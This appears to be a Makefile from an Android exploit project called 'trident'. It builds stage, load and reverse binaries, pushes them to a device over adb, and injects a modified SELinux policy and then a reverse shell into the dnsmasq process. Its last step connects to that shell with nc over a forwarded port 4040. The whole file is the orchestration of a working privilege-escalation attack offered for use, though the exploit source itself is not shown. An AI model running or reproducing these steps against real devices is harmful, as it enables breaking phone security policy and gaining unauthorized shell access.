all: build-all

# compile the binaries
obj/local/arm64-v8a/reverse: 
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=arm64-v8a reverse

obj/local/arm64-v8a/load: 
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=arm64-v8a load

obj/local/arm64-v8a/stage:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=arm64-v8a stage

# pseudo instruction to perform stage, load and reverse stages.
build-all: obj/local/arm64-v8a/reverse obj/local/arm64-v8a/stage obj/local/arm64-v8a/load

# show the logs for the trident
log: 
	adb logcat | grep -a trident

# runs the exploit. build all, push all, then carry user through the ropes.
run: build-all sepolicy
	adb push sepolicy /data/local/tmp/sepolicy
	adb push obj/local/arm64-v8a/load /data/local/tmp/load
	adb push obj/local/arm64-v8a/reverse /data/local/tmp/reverse
	adb push obj/local/arm64-v8a/stage /data/local/tmp/stage
	adb shell chmod 777 /data/local/tmp/reverse /data/local/tmp/stage /data/local/tmp/load
	adb shell /data/local/tmp/stage /data/local/tmp/load
	@echo "sepolicy injection binary loaded into dnsmasq!"
	@echo "Wait for load done!, then turn off Mobile Hotspot, then type make reverse"

reverse:
	adb forward tcp:4040 tcp:4040
	adb shell /data/local/tmp/stage /data/local/tmp/reverse
	@echo "reverse shell binary loaded into dnsmasq."
	@echo "Wait for reverse loaded, turn off Mobile Hotspots, then type make connect"

connect:
	@echo "there is no prompt, type ls to test connection!!"
	nc localhost 4040

clean:
	rm -rf obj

sepolicy:
	@echo "-=-=-=-=-=->] sepolicy IS MISSING!!! [<-=-=-=-=-=-\n\n...sepolicy is provided by the user!\n\n\n Please place a modified sepolicy in this directory\n\n..DO NOT EXCEED phone sepolicy size!!!\n\n\n)"
